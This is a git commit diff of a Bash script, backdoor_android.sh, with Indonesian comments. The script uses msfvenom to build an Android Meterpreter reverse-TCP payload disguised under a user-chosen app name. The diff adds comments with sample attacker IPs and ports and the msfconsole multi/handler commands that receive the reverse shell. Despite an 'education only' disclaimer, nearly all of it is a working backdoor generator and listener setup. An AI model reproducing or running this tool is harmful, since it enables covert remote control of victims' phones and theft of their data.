ec80176efec5345cdabdfc83f1fb89527a04a9e3
FII14 <121723975+FII14@users.noreply.github.com>
2023-08-13 07:43:04 +0700

    Update backdoor_android.sh

--- backdoor_android.sh
+++ backdoor_android.sh
@@ -1,9 +1,26 @@
 #!/bin/bash
-# backdoor android
-# hanya untuk edukasi, jangan disalahgunakan.
+# Backdoor android
+# Hanya untuk edukasi, jangan disalahgunakan.
 
 payload="android/meterpreter/reverse_tcp"
+
+# Asumsi 
+#----------------------------------------
+# Ip penyerang (kali linux) 192.168.1.10 
+# Port penyerang (kali linux) 4444
+#----------------------------------------
+
 read -p "Masukkan alamat ip address: " lhost
 read -p "Masukkan port: " lport
 read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
 msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"
+
+# Disisi penyerang (kali linux)
+# +-------------------------------------------
+# msfconsole                                  
+# use exploit/multi/handler                   
+# set payload android/meterpreter/reverse_tcp 
+# set lhost 192.168.0.209                     
+# set lport 443                               
+# exploit                                     
+# --------------------------------------------
